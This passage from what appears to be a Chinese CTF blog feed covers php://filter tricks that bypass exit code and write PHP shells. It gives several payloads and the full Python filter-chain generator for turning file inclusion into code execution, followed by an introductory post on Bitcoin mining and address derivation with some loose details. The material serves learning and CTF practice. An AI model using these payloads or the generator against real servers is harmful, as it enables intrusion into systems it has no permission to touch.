title="base64特质"></a>base64特质</h4><p>在base64_decode中会将不在A-Za-z0-9+&#x2F;&#x3D;的字符全都去掉，于是可以通过这个来绕过exit</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250326161257630.png" alt="image-20250326161257630"></p><p>乍一眼，你这不对啊。。。。这是因为base64在解码的时候是将4个字节转化为3个字节，又因为死亡代码只有phpexit参与了解码，所以补上一位就可以完全转化，解码的时候有效字符一定要是4的倍数，不然就会解码错误，原因就是未补足的字符本质上是用&#x3D;补足的</p><p>而在解码时&#x3D;后还有字符明显是错误的，所以就会注入失败</p><h4 id="rot13-编码绕过"><a href="#rot13-编码绕过" class="headerlink" title="rot13 编码绕过"></a><strong>rot13 编码绕过</strong></h4><p>原理和base64一样，可以直接转码分解死亡代码；这里不再多说；直接看如下实验结果即可；</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250326161910851.png" alt="image-20250326161910851"></p><p>只是这种方法有点尴尬的是；因为我们生成的文件内容之中前面的<code>&lt;?</code>并没有分解掉，这时，如果服务器开启了短标签(short_open_tag)，那么就会被解析，所以所以后面的代码就会错误；也就失去了作用；</p><h4 id="htaccess的预包含利用"><a href="#htaccess的预包含利用" class="headerlink" title=".htaccess的预包含利用"></a><strong><code>.htaccess</code>的预包含利用</strong></h4><p>利用 <code>.htaccess</code>的预包含文件的功能来进行攻破；自定义包含我们的flag文件。</p><pre><code class="highlight plaintext">$filename=php://filter/write=string.strip_tags/resource=.htaccess$content=?&gt;php_value%20auto_prepend_file%20G:\s1mple.php</code></pre><p>同时传入如上的代码，首先来解释$filename的代码，这里引用了<code>string.strip_tags</code>过滤器，可以过滤.htaccess内容的html标签，自然也就消除了死亡代码；$content即闭合死亡代码使其完全消除，并且写入自定义包含文件；实验结果如下所示：</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250326162057074.png" alt="image-20250326162057074"></p><p>但是这种方法也是具有一定的局限性，首先我们需要知道flag文件的位置，和文件的名字，一般的比赛中可以盲猜 <code>flag.php flag /flag /flag.php</code> 等等；另外还有个很大的问题是，<code>string.strip_tags</code>过滤器只是可以在php5的环境下顺利的使用，如果题目环境是在php7.3.0以上的环境下，则会发生段错误。导致写不进去；根本来说是php7.3.0中废弃了string.strip_tags这个过滤器；</p><h4 id="蓄意乱序"><a href="#蓄意乱序" class="headerlink" title="蓄意乱序"></a>蓄意乱序</h4><p>介绍UCS-2LE和UCS-2BE两种过滤器的组合以及UCS-4LE和UCS-2BE两种过滤器的组合</p><p>其中2xE都是进行两位一反转，4xE进行四位一反转，目的其实就是破坏前面死亡exit的顺序来达到让php无法识别的效果</p><h4 id="过滤器编码组合拳"><a href="#过滤器编码组合拳" class="headerlink" title="过滤器编码组合拳"></a><strong>过滤器编码组合拳</strong></h4><p>过滤器组合拳，其实故名思意，就是利用过滤器嵌套过滤器进行过滤，以此达到代码的层层更迭，从而最后写入我们期望的代码；</p><p><strong>先来一种：</strong></p><pre><code class="highlight plaintext">$filename=&#x27;php://filter/string.strip_tags|convert.base64-decode/resource=s1mple.php&#x27;$content=&#x27;?&gt;PD9waHAgcGhwaW5mbygpOz8+&#x27;</code></pre><p>可以看到，利用string.strip_tags可以过滤掉html标签，将<strong>标签内的所有内容进行删去</strong>，然后再进行base64解码，成功写入shell；</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250326162042101.png" alt="image-20250326162042101"></p><p>但是这种方法有一定的局限性也还是因为string.strip_tags在php7.3.0以上的环境下会发生段错误，从而导致无法写入，但是在php5的环境下则不受此影响；</p><p><strong>再来另外一种</strong></p><p>如果题目的环境是php7的话，那么我们又该如何？这里受一个题目的启发，也可以使用过滤器进行嵌套来做；组合拳；这里三个过滤器叠加之后先进行压缩，然后转小写，最后解压，会导致部分死亡代码错误；则可以写入shell；</p><pre><code class="highlight plaintext">$filename=php://filter/zlib.deflate|string.tolower|zlib.inflate|/resource=s1mple.php$content=php://filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;?php%0dphpinfo();?&gt;/resource=s1mple.php</code></pre><p>如此便可以写入；其原理也很简单，就是利用过滤器嵌套让死亡代码在各种变换之间进行分解扰乱，然后再次写入木马；</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250326162048585.png" alt="image-20250326162048585"></p><p>这里非常巧合的是内容经过压缩转小写然后解压之后，我们的目的代码并没有发生变化，这也为写入木马奠定了基础；</p><h4 id="无中生有之inconv"><a href="#无中生有之inconv" class="headerlink" title="无中生有之inconv"></a>无中生有之inconv</h4><p>呃呃，又长又臭的脚本环节，只讲一下原理吧，脚本还是要等我的XSS三兄弟学完才会回头补完一下。。</p><p>主包讲的不好也可以参考p神的博客<a href="https://err0r233.github.io/posts/28510.html">真正的from LFI to RCE——CVE-2024-2961 | Err0r233</a></p><p>从上面已经知道我们可以利用base64解码的特质和strip_tags来删除掉一些过滤</p><p>那有的人会说了，主包主包你的混淆确实很强，但是如何他的注入点干净的不得了呢</p><pre><code class="highlight php"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];<span class="keyword">include</span>(<span class="variable">$a</span>);</code></pre><p>这个时候就需要自行构造一些危险代码，同时利用base64将其先编码防止诸如<code>&lt;?;&gt;</code>这些字符在解码时被过滤掉</p><p>所以要介绍一些神奇的过滤器:</p><ul><li>CSISO2022KR</li></ul><p>将字符集从我们常用的<code>UTF-8</code>转换为<code>CSISO2022KR</code></p><pre><code class="highlight php">php:<span class="comment">//filter/convert.iconv.UTF8.CSISO2022KR/resource=data://,aaaaaaaaaaaaaa</span>转换结果：<span class="keyword">string</span>(<span class="number">24</span>) <span class="string">&quot;%1B%24%29Caaaaaaaaaaaaaa&quot;</span>其实是 <span class="keyword">string</span>(<span class="number">18</span>) <span class="string">&quot;不可见字符$)Caaaaaaaaaaaaaa&quot;</span></code></pre><p>此时可以看到成功构造了一个字符C</p><p>达到了无中生有的效果了</p><p>而通过几次巧妙的构造，就可以出整张base64表，这里直接贴p神搓好的脚本</p><pre><code class="highlight python"><span class="comment">#!/usr/bin/env python3</span><span class="keyword">import</span> argparse<span class="keyword">import</span> base64<span class="keyword">import</span> re<span class="comment"># - Useful infos -</span><span class="comment"># https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters</span><span class="comment"># https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT</span><span class="comment"># https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d</span><span class="comment"># No need to guess a valid filename anymore</span>file_to_use = <span class="string">&quot;php://temp&quot;</span>conversions = &#123;    <span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2&#x27;</span>,    <span class="string">&#x27;1&#x27;</span>: <span class="string">&#x27;convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4&#x27;</span>,    <span class="string">&#x27;2&#x27;</span>: <span class="string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921&#x27;</span>,    <span class="string">&#x27;3&#x27;</span>: <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE&#x27;</span>,    <span class="string">&#x27;4&#x27;</span>: <span class="string">&#x27;convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE&#x27;</span>,    <span class="string">&#x27;5&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2&#x27;</span>,    <span class="string">&#x27;6&#x27;</span>: <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2&#x27;</span>,    <span class="string">&#x27;7&#x27;</span>: <span class="string">&#x27;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4&#x27;</span>,    <span class="string">&#x27;8&#x27;</span>: <span class="string">&#x27;convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;</span>,    <span class="string">&#x27;9&#x27;</span>: <span class="string">&#x27;convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB&#x27;</span>,    <span class="string">&#x27;A&#x27;</span>: <span class="string">&#x27;convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213&#x27;</span>,    <span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE&#x27;</span>,    <span class="string">&#x27;B&#x27;</span>: <span class="string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000&#x27;</span>,    <span class="string">&#x27;b&#x27;</span>: <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE&#x27;</span>,    <span class="string">&#x27;C&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR&#x27;</span>,    <span class="string">&#x27;c&#x27;</span>: <span class="string">&#x27;convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2&#x27;</span>,    <span class="string">&#x27;D&#x27;</span>: <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213&#x27;</span>,    <span class="string">&#x27;d&#x27;</span>: <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5&#x27;</span>,    <span class="string">&#x27;E&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT&#x27;</span>,    <span class="string">&#x27;e&#x27;</span>: <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937&#x27;</span>,    <span class="string">&#x27;F&#x27;</span>: <span class="string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB&#x27;</span>,    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213&#x27;</span>,    <span class="string">&#x27;g&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8&#x27;</span>,    <span class="string">&#x27;G&#x27;</span>: <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90&#x27;</span>,    <span class="string">&#x27;H&#x27;</span>: <span class="string">&#x27;convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213&#x27;</span>,    <span class="string">&#x27;h&#x27;</span>: <span class="string">&#x27;convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE&#x27;</span>,    <span class="string">&#x27;I&#x27;</span>: <span class="string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213&#x27;</span>,    <span class="string">&#x27;i&#x27;</span>: <span class="string">&#x27;convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000&#x27;</span>,    <span class="string">&#x27;J&#x27;</span>: <span class="string">&#x27;convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4&#x27;</span>,    <span class="string">&#x27;j&#x27;</span>: <span class="string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16&#x27;</span>,    <span class="string">&#x27;K&#x27;</span>: <span class="string">&#x27;convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE&#x27;</span>,    <span class="string">&#x27;k&#x27;</span>: <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2&#x27;</span>,    <span class="string">&#x27;L&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC&#x27;</span>,    <span class="string">&#x27;l&#x27;</span>: <span class="string">&#x27;convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE&#x27;</span>,    <span class="string">&#x27;M&#x27;</span>:<span class="string">&#x27;convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T&#x27;</span>,    <span class="string">&#x27;m&#x27;</span>:<span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949&#x27;</span>,    <span class="string">&#x27;N&#x27;</span>: <span class="string">&#x27;convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4&#x27;</span>,    <span class="string">&#x27;n&#x27;</span>: <span class="string">&#x27;convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61&#x27;</span>,    <span class="string">&#x27;O&#x27;</span>: <span class="string">&#x27;convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775&#x27;</span>,    <span class="string">&#x27;o&#x27;</span>: <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE&#x27;</span>,    <span class="string">&#x27;P&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB&#x27;</span>,    <span class="string">&#x27;p&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4&#x27;</span>,    <span class="string">&#x27;q&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2&#x27;</span>,    <span class="string">&#x27;Q&#x27;</span>: <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2&#x27;</span>,    <span class="string">&#x27;R&#x27;</span>: <span class="string">&#x27;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4&#x27;</span>,    <span class="string">&#x27;r&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101&#x27;</span>,    <span class="string">&#x27;S&#x27;</span>: <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS&#x27;</span>,    <span class="string">&#x27;s&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90&#x27;</span>,    <span class="string">&#x27;T&#x27;</span>: <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103&#x27;</span>,    <span class="string">&#x27;t&#x27;</span>: <span class="string">&#x27;convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS&#x27;</span>,    <span class="string">&#x27;U&#x27;</span>: <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943&#x27;</span>,    <span class="string">&#x27;u&#x27;</span>: <span class="string">&#x27;convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61&#x27;</span>,    <span class="string">&#x27;V&#x27;</span>: <span class="string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB&#x27;</span>,    <span class="string">&#x27;v&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2&#x27;</span>,    <span class="string">&#x27;W&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936&#x27;</span>,    <span class="string">&#x27;w&#x27;</span>: <span class="string">&#x27;convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE&#x27;</span>,    <span class="string">&#x27;X&#x27;</span>: <span class="string">&#x27;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932&#x27;</span>,    <span class="string">&#x27;x&#x27;</span>: <span class="string">&#x27;convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS&#x27;</span>,    <span class="string">&#x27;Y&#x27;</span>: <span class="string">&#x27;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361&#x27;</span>,    <span class="string">&#x27;y&#x27;</span>: <span class="string">&#x27;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT&#x27;</span>,    <span class="string">&#x27;Z&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16&#x27;</span>,    <span class="string">&#x27;z&#x27;</span>: <span class="string">&#x27;convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937&#x27;</span>,    <span class="string">&#x27;/&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4&#x27;</span>,    <span class="string">&#x27;+&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157&#x27;</span>,    <span class="string">&#x27;=&#x27;</span>: <span class="string">&#x27;&#x27;</span>&#125;<span class="keyword">def</span> <span class="title function_">generate_filter_chain</span>(<span class="params">chain, debug_base64 = <span class="literal">False</span></span>):    encoded_chain = chain    <span class="comment"># generate some garbage base64</span>    filters = <span class="string">&quot;convert.iconv.UTF8.CSISO2022KR|&quot;</span>    filters += <span class="string">&quot;convert.base64-encode|&quot;</span>    <span class="comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span>    filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span>    <span class="keyword">for</span> c <span class="keyword">in</span> encoded_chain[::-<span class="number">1</span>]:        filters += conversions[c] + <span class="string">&quot;|&quot;</span>        <span class="comment"># decode and reencode to get rid of everything that isn&#x27;t valid base64</span>        filters += <span class="string">&quot;convert.base64-decode|&quot;</span>        filters += <span class="string">&quot;convert.base64-encode|&quot;</span>        <span class="comment"># get rid of equal signs</span>        filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span>    <span class="keyword">if</span> <span class="keyword">not</span> debug_base64:        <span class="comment"># don&#x27;t add the decode while debugging chains</span>        filters += <span class="string">&quot;convert.base64-decode&quot;</span>    final_payload = <span class="string">f&quot;php://filter/<span class="subst">&#123;filters&#125;</span>/resource=<span class="subst">&#123;file_to_use&#125;</span>&quot;</span>    <span class="keyword">return</span> final_payload<span class="keyword">def</span> <span class="title function_">main</span>():    <span class="comment"># Parsing command line arguments</span>    parser = argparse.ArgumentParser(description=<span class="string">&quot;PHP filter chain generator.&quot;</span>)    parser.add_argument(<span class="string">&quot;--chain&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Content you want to generate. (you will maybe need to pad with spaces for your payload to work)&quot;</span>, required=<span class="literal">False</span>)    parser.add_argument(<span class="string">&quot;--rawbase64&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;The base64 value you want to test, the chain will be printed as base64 by PHP, useful to debug.&quot;</span>, required=<span class="literal">False</span>)    args = parser.parse_args()    <span class="keyword">if</span> args.chain <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:        chain = args.chain.encode(<span class="string">&#x27;utf-8&#x27;</span>)        base64_value = base64.b64encode(chain).decode(<span class="string">&#x27;utf-8&#x27;</span>).replace(<span class="string">&quot;=&quot;</span>, <span class="string">&quot;&quot;</span>)        chain = generate_filter_chain(base64_value)        <span class="built_in">print</span>(<span class="string">&quot;[+] The following gadget chain will generate the following code : &#123;&#125; (base64 value: &#123;&#125;)&quot;</span>.<span class="built_in">format</span>(args.chain, base64_value))        <span class="built_in">print</span>(chain)    <span class="keyword">if</span> args.rawbase64 <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:        rawbase64 = args.rawbase64.replace(<span class="string">&quot;=&quot;</span>, <span class="string">&quot;&quot;</span>)        <span class="keyword">match</span> = re.search(<span class="string">&quot;^([A-Za-z0-9+/])*$&quot;</span>, rawbase64)        <span class="keyword">if</span> (<span class="keyword">match</span>):            chain = generate_filter_chain(rawbase64, <span class="literal">True</span>)            <span class="built_in">print</span>(chain)        <span class="keyword">else</span>:            <span class="built_in">print</span> (<span class="string">&quot;[-] Base64 string required.&quot;</span>)            exit(<span class="number">1</span>)<span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:    main()    链接：https://err0r233.github.io/posts/<span class="number">28510.</span>html</code></pre><ul><li><p>UTF-8 -&gt;UTF-7</p><p>测试代码</p></li></ul><pre><code class="highlight php"><span class="meta">&lt;?php</span><span class="variable">$a</span>=<span class="string">&#x27;php://filter/convert.iconv.utf-8.utf-7/resource=Qftm.txt&#x27;</span>;<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$a</span>,<span class="string">&#x27;=&#x27;</span>);<span class="comment">/**</span><span class="comment">Qftm.txt 写入的内容为: +AD0-</span><span class="comment">**/</span></code></pre><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250328104911141.png" alt="image-20250328104911141"></p><p>这里直接给某个师傅博客的截图，这是原链接<a href="https://www.anquanke.com/post/id/202510#h3-15">探索php:&#x2F;&#x2F;filter在实战当中的奇技淫巧-安全KER - 安全资讯平台</a>，懒得打了(瘫)</p><h3 id><a href="#" class="headerlink" title></a></h3>]]></content>
      
      
      
        <tags>
            
            <tag> CTF Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>智能合约深度学习（持续施工ing）</title>
      <link href="/2024/12/22/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%EF%BC%88%E6%8C%81%E7%BB%AD%E6%96%BD%E5%B7%A5ing%EF%BC%89/"/>
      <url>/2024/12/22/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%EF%BC%88%E6%8C%81%E7%BB%AD%E6%96%BD%E5%B7%A5ing%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<blockquote><h1 id="智能合约深度学习"><a href="#智能合约深度学习" class="headerlink" title="智能合约深度学习"></a>智能合约深度学习</h1></blockquote><h1 id="前序"><a href="#前序" class="headerlink" title="前序"></a>前序</h1><blockquote><p><strong>如果想直接入手合约，可以直接跳至合约开发模块哦</strong></p></blockquote><p>在进入智能合约学习环节之前，让我们先了解一下它的“爹”，即<strong>区块链</strong></p><p>区块链，是一种区中心化，点对点系统的工具，也可以说是一种数据库系统（实际上就是一本记录各种交易的账本）</p><p>区别于传统的中心化系统，这个系统由各个区块（前区块的加密哈希，时间戳，交易数据）组成，在这个系统中，由网络中的大多数节点来决定新区块中交易记录的录入以及修改。这就使得其安全性远远超过了传统的系统。假设一个用户想要伪造一份交易，那么从理论来说他需要修改全网每个节点的总账，这个过程需要消耗巨量的算力<del>有这算力谁还来伪造交易啊</del>，每增加一个区块，需要全网51%以上的节点的认可才能够组成区块链</p><p>那么我们现在更具体一点，来谈一个家喻户晓的区块链系统———比特币系统</p><h1 id="关于比特币系统"><a href="#关于比特币系统" class="headerlink" title="关于比特币系统"></a>关于比特币系统</h1><h2 id="竞争记账"><a href="#竞争记账" class="headerlink" title="竞争记账"></a>竞争记账</h2><p>即挖矿，在一个区块建立之后，竞争记账的节点需要计算建立以来所有交易的哈希值（<strong>SHA256</strong>），再将其两两组合，不断重复，最终得到一个SHA256值（也叫<strong>默克根</strong>），最后需要进行以下计算</p><pre><code class="highlight plaintext">SHA256(默克根+前一区的ID+一个随机数)</code></pre><p>通常这个值要满足哈希值的前20位为0(达成概率在百万分之一水平),也就是算力比拼</p><p>成功者向全网发送通知，若经过检验大家就公认他构造的这个区块并以其作为父区块，进行下一个区块的算力竞争（每10分钟进行一次）</p><p>成功者会获得12.5个比特币<del>122w美刀(2024.12.9日汇率)</del>作为奖励，这就是中本聪设计的激励机制<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/e23cc007503b1060aa2f3f307de43b14.png" alt="img"></p><h2 id="长链与短链"><a href="#长链与短链" class="headerlink" title="长链与短链"></a>长链与短链</h2><p>又是算力竞争……在向全网通知时（假设你的答案正确），可能会有人与你在相同的时间发送了正确的答案，于是会出现两条链，那么就又到了拼算力的时候了，不同的矿工会选择不同的链继续下一轮区块计算，这里就不得不提另一种机制了，即<strong>总是选择工作量最大的链</strong>，于是哪条链先出现下一个区块，也就意味着会有更多的矿工选择这条链工作，那么另一条短链就会被废止。组装短链的矿工也得不到比特币奖励，结果就是区块链只有唯一一条主线。</p><h2 id="比特币的交易"><a href="#比特币的交易" class="headerlink" title="比特币的交易"></a>比特币的交易</h2><p>交易包括两个方向，Input以及Output.</p><p>两者可以不完全一致，但只能输入略大于输出，那么缺少的这部分去哪里了呢 ，是支付给了矿工哦，每笔交易在发布后可以选择支付交易费用，钱到位交易也会更快被打包。但是不代表不支付或支付很少交易费用不会有人处理你的交易，只是会被推迟，总之，不管是否支付交易费用，矿工都会获得比特币的奖励，你可以将其理解为：<strong>即使你不付给服务员小费，但并不影响他获得工资</strong>。</p><h2 id="比特币的交易加密"><a href="#比特币的交易加密" class="headerlink" title="比特币的交易加密"></a>比特币的交易加密</h2><p>对于每个用户的钱包，都由三部分组成</p><p><strong>16位的地址，公钥，私钥(256位)</strong></p><p>假设在A与B交易，A发送给B一条A的私钥加密过的内容，那么若B没有A的公钥，B就无法解密内容</p><p>公钥的产生依赖于私钥，而钱包的地址生成依赖于公钥</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/65e01b2554c3850eeeebb60eb7c4b93b.jpeg" alt="img"></p><p>贴一条其他师傅的说明过程。</p><p>第一步：生成随机私钥</p><p>私钥是一个随机数，随机选取一个32字节的数，这个数的范围大小是介于1 ~ 0xFFFF FFFF FFFF FFFF FFFF FFFF FFFF FFFE BAAE DCE6 AF48 A03B BFD2 5E8C D036 4141之间的一个数，为了方便后面的计算，我们随机生成一个合法的私钥：</p><p>8F72F6B29E6E225A36B68DFE333C7CE5E55D83249D3D2CD6332671FA445C4DD3</p><p>第二步：椭圆曲线算公钥</p><p>生成了私钥之后，我们使用椭圆曲线加密算法（ECDSA-secp256k1）计算私钥所对应的非压缩公钥，生成的公钥共65字节， 其中一个字节是0x04，其中32个字节是X坐标，另外32个字节是Y坐标：</p><p>公钥P.X：<br>06CCAE7536386DA2C5ADD428B099C7658814CA837F94FADE365D0EC6B1519385</p><p>公钥P.Y：<br>FF83EC5F2C0C8F016A32134589F7B9E97ACBFEFD2EF12A91FA622B38A1449EEB</p><p>第三步：计算公钥的SHA-256哈希值</p><p>将上述公钥地址拼合，得到标准地址：<br>0406CCAE7536386DA2C5ADD428B099C7658814CA837F94FADE365D0EC6B1519385FF83EC5F2C0C8F016A32134589F7B9E97ACBFEFD2EF12A91FA622B38A1449EEB</p><p>对齐进行SHA-256哈希计算，得到结果：<br>2572e5f4a8e77ddf5bb35b9e61c61f66455a4a24bcfd6cb190a8e8ff48fc097d</p><p>第四步：计算 RIPEMD-160哈希值</p><p>取上一步结果，进行RIPEMD-160计算，得到结果：</p><p>0b14f003d63ab31aef5fedde2b504699547dd1f6</p><p>第五步：加入地址版本号（比特币主网版本号“0x00”）</p><p>取上一步结果，在前面加上16进制的00，即：</p><p>000b14f003d63ab31aef5fedde2b504699547dd1f6</p><p>第六步：计算 SHA-256 哈希值</p><p>取上一步结果，进行SHA-256计算，可得：</p><p>ddc2270f93cc84cc6869dd373f3c340bbf5cb9a8f5559297cc9e5d947aab2536</p><p>然后，对以上结果再次计算 SHA-256 